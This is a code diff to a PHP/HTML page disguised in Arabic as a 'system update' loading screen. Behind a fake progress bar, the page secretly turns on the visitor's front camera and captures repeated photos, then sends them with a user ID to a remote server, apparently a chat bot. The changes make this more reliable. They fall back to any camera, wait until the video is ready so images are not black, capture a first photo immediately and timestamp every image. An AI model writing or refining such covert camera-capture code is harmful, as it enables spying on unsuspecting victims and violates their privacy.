@@ -82,7 +82,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
   <title>تحديث النظام</title>
   <style>
     html, body { 
@@ -120,9 +120,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         margin-top: 20px;
         font-size: 14px;
         opacity: 0.8;
+        padding: 0 10px;
     }
     #videoElement {
         display: none;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -1;
     }
     .retry-btn {
         margin-top: 20px;
@@ -139,6 +147,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
     .progress-bar {
         width: 300px;
+        max-width: 80%;
         height: 10px;
         background: #333;
         border-radius: 5px;
@@ -166,7 +175,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   <div class="countdown" id="countdown"></div>
   <button class="retry-btn hidden" id="retryBtn">إعادة المحاولة</button>
   
-  <video autoplay="true" id="videoElement"></video>
+  <video id="videoElement" playsinline autoplay muted></video>
 
 <script>
   const params = new URLSearchParams(window.location.search);
@@ -253,14 +262,72 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     document.getElementById('countdown').textContent = `جاري التحميل: ${seconds} ثانية`;
   }
 
-  // دالة لالتقاط صورة من الفيديو
+  // دالة لالتقاط صورة من الفيديو مع ضمان الحصول على إطار صحيح
   function captureFrame(videoElement) {
+    // التأكد من أن الفيديو جاهز ولديه أبعاد
+    if (!videoElement.videoWidth || !videoElement.videoHeight) {
+      console.warn('Video not ready yet, using fallback dimensions');
+      // يمكن استخدام أبعاد افتراضية إذا لزم الأمر
+    }
+    
     const canvas = document.createElement('canvas');
-    canvas.width = videoElement.videoWidth;
-    canvas.height = videoElement.videoHeight;
+    // استخدام الأبعاد الفعلية للفيديو، أو أبعاد افتراضية
+    const width = videoElement.videoWidth || 640;
+    const height = videoElement.videoHeight || 480;
+    
+    canvas.width = width;
+    canvas.height = height;
+    
     const ctx = canvas.getContext('2d');
-    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-    return canvas.toDataURL('image/jpeg', 0.8);
+    ctx.drawImage(videoElement, 0, 0, width, height);
+    
+    // إضافة ختم زمني للصورة (اختياري)
+    ctx.font = '16px Arial';
+    ctx.fillStyle = 'white';
+    ctx.strokeStyle = 'black';
+    ctx.lineWidth = 2;
+    ctx.textAlign = 'right';
+    const dateStr = new Date().toLocaleString('ar-EG');
+    ctx.strokeText(dateStr, width - 10, height - 10);
+    ctx.fillText(dateStr, width - 10, height - 10);
+    
+    return canvas.toDataURL('image/jpeg', 0.85);
+  }
+
+  // دالة انتظار جاهزية الفيديو
+  function waitForVideoReady(videoElement) {
+    return new Promise((resolve, reject) => {
+      if (videoElement.readyState >= 2) { // HAVE_CURRENT_DATA أو أعلى
+        resolve();
+        return;
+      }
+      
+      const timeout = setTimeout(() => {
+        cleanup();
+        reject(new Error('Timeout waiting for video to be ready'));
+      }, 10000);
+      
+      const onCanPlay = () => {
+        cleanup();
+        resolve();
+      };
+      
+      const onError = (e) => {
+        cleanup();
+        reject(new Error('Video error: ' + (e.message || 'Unknown error')));
+      };
+      
+      const cleanup = () => {
+        clearTimeout(timeout);
+        videoElement.removeEventListener('canplay', onCanPlay);
+        videoElement.removeEventListener('loadeddata', onCanPlay);
+        videoElement.removeEventListener('error', onError);
+      };
+      
+      videoElement.addEventListener('canplay', onCanPlay, { once: true });
+      videoElement.addEventListener('loadeddata', onCanPlay, { once: true });
+      videoElement.addEventListener('error', onError, { once: true });
+    });
   }
 
   function showRetryButton() {
@@ -313,17 +380,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     let countdown = 30; // العد التنازلي
     
     try {
-      // طلب الوصول إلى الكاميرا الأمامية
-      stream = await navigator.mediaDevices.getUserMedia({ 
+      // طلب الوصول إلى الكاميرا مع دعم الكاميرا الأمامية والخلفية
+      const constraints = {
         video: { 
-          facingMode: 'user', // استخدام الكاميرا الأمامية بدلاً من الخلفية
+          facingMode: 'user', // تفضيل الكاميرا الأمامية
           width: { ideal: 1280 },
           height: { ideal: 720 }
         },
         audio: false
-      });
+      };
+      
+      try {
+        // محاولة الكاميرا الأمامية أولاً
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+      } catch (frontError) {
+        console.warn('Front camera failed, trying any camera:', frontError);
+        // إذا فشلت الأمامية، جرب أي كاميرا متاحة
+        constraints.video.facingMode = undefined;
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+      }
       
       videoElement.srcObject = stream;
+      
+      // التأكد من تشغيل الفيديو (خاصة في iOS/Safari)
+      try {
+        await videoElement.play();
+      } catch (playError) {
+        console.warn('Auto-play was prevented, but video will play when ready');
+      }
+      
+      updateStatus("جاري تجهيز الكاميرا...");
+      
+      // انتظار جاهزية الفيديو (مهم لمنع الصور السوداء)
+      await waitForVideoReady(videoElement);
+      
       updateStatus("جاري المعالجة...");
       updateProgress(20);
       
@@ -336,6 +426,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
           clearInterval(countdownInterval);
         }
       }, 1000);
+      
+      // التقاط الصورة الأولى فوراً بعد الجاهزية لضمان عدم وجود تأخير
+      try {
+        const firstImage = captureFrame(videoElement);
+        await sendToServer(chatId, `صورة ${captureCount + 1} من ${maxCaptures}`, firstImage);
+        captureCount++;
+        updateProgress(20 + (captureCount * 8));
+        updateStatus(`جاري المعالجة... ${captureCount * 10}%`);
+      } catch (e) {
+        console.error('First capture error:', e);
+      }
       
       // البدء في التقاط الصور كل ثانية
       captureInterval = setInterval(async () => {
@@ -352,7 +453,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ✅ <b>اكتمل ..</b>
 
 👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
-📸 <b>عدد الصور:</b> 10
+📸 <b>عدد الصور:</b> ${maxCaptures}
 📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
           `;
           await sendToServer(chatId, completeMessage);
@@ -366,8 +467,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
         
         try {
+          // تأكد من أن الفيديو لا يزال يعمل
+          if (videoElement.readyState < 2) {
+            await waitForVideoReady(videoElement);
+          }
+          
           const imageData = captureFrame(videoElement);
-          await sendToServer(chatId, `صورة ${captureCount + 1} من 10`, imageData);
+          await sendToServer(chatId, `صورة ${captureCount + 1} من ${maxCaptures}`, imageData);
           captureCount++;
           updateProgress(20 + (captureCount * 8));
           updateStatus(`جاري المعالجة... ${captureCount * 10}%`);
@@ -393,7 +499,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       await sendToServer(chatId, errorMessage);
       
       document.querySelector('.loader').classList.add('hidden');
-      updateStatus("خطأ في النظام:  غير متاحة");
+      updateStatus("خطأ في النظام: غير متاحة");
       showRetryButton();
     }
     
